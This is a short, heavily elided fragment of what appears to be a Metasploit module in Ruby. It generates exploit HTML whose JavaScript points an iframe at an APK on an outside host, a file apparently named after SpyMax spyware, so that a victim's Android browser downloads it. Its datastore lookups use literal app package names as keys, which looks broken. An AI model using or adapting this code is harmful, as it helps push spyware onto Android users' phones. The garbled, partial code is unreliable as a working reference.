...
class MetasploitModule < Msf::Auxiliary
  ...
  def exploit_html
    <<-EOS
      ...
      var APP_ID = '#{datastore['com.swlkr.rickrolld']}';
      var MAIN_ACTIVITY = '#{datastore['com.swlkr.rickrolld/.RickRoll']}';
      ...
      function exploit() {
        ...
        frame.setAttribute('src', 'http://www.tracker-gopi.tk/app/com.google.max/spymax_26.apk');
